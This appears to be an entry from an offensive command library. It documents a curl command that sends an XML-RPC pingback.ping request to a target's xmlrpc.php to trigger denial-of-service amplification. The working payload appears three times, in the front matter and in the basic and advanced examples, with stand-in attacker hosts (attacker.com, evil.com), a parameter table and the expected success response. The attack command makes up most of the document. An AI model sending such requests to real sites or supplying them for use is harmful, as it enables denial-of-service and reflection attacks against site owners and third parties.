---
id: cmd-curl-pingback-dos
data: >-
  curl -s -X POST http://target.com/xmlrpc.php -d '<?xml
  version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/malicious</string></value></param><param><value><string>http://target.com/vulnerable-page</string></value></param></params></methodCall>'
tags:
  - dos
  - web
type: command
output: Pingback success or fault response
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.522Z'
verified: false
validated: true
submitted: true
---
# curl-pingback-dos

## Command

```bash
curl -s -X POST http://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/malicious</string></value></param><param><value><string>http://target.com/vulnerable-page</string></value></param></params></methodCall>'
```

## Description

Sends a pingback.ping XML-RPC request to trigger amplification for DoS. The target fetches the attacker URL, consuming resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `-X POST` | POST method | Yes |
| `http://target.com/xmlrpc.php` | Target URL | Yes |
| `-d '<payload>'` | Pingback XML payload | Yes |

## Examples

### Basic Usage

```bash
curl -s -X POST http://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com</string></value></param><param><value><string>http://target.com/page</string></value></param></params></methodCall>'
```

### Advanced Usage

```bash
curl -s -X POST http://target.com/xmlrpc.php -d @pingback.xml --max-time 10
```

## Expected Output

`<?xml version="1.0"?><methodResponse><params><param><value><boolean>1</boolean></value></param></params></methodResponse>` for success.

## Related

- [[Related Procedure: Exploit-xmlrpc.php-for-DoS-via-Pingbacks]]
